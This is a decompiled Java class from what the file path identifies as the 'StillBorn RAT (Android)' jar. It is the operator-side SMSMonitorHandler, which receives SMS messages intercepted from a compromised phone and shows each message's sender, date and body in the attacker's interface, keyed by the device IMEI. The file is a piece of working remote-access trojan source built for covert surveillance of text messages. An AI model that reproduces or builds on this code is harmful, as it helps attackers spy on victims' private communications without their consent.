/*  1:   */ package handler;
/*  2:   */ 
/*  3:   */ import Packet.Packet;
/*  4:   */ import Packet.ShortSMSPacket;
/*  5:   */ import gui.GUI;
/*  6:   */ import java.util.HashMap;
/*  7:   */ import server.Server;
/*  8:   */ 
/*  9:   */ public class SMSMonitorHandler
/* 10:   */   implements PacketHandler
/* 11:   */ {
/* 12:   */   private GUI gui;
/* 13:   */   private int channel;
/* 14:   */   private String imei;
/* 15:   */   
/* 16:   */   public SMSMonitorHandler() {}
/* 17:   */   
/* 18:   */   public SMSMonitorHandler(int channel, String imei, GUI gui)
/* 19:   */   {
/* 20:40 */     this.gui = gui;
/* 21:41 */     this.channel = channel;
/* 22:42 */     this.imei = imei;
/* 23:   */   }
/* 24:   */   
/* 25:   */   public void receive(Packet p, String imei) {}
/* 26:   */   
/* 27:   */   public void handlePacket(Packet p, String temp_imei, Server c)
/* 28:   */   {
/* 29:52 */     this.gui.logTxt("SMS bilgisi alındı");
/* 30:53 */     ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).getStorage(this.channel).reset();
/* 31:54 */     ShortSMSPacket packet = (ShortSMSPacket)p;
/* 32:55 */     this.gui.addMonitoredSMS(this.imei, packet.getAddress(), packet.getDate(), packet.getBody());
/* 33:   */   }
/* 34:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.SMSMonitorHandler
 * JD-Core Version:    0.7.0.1
 */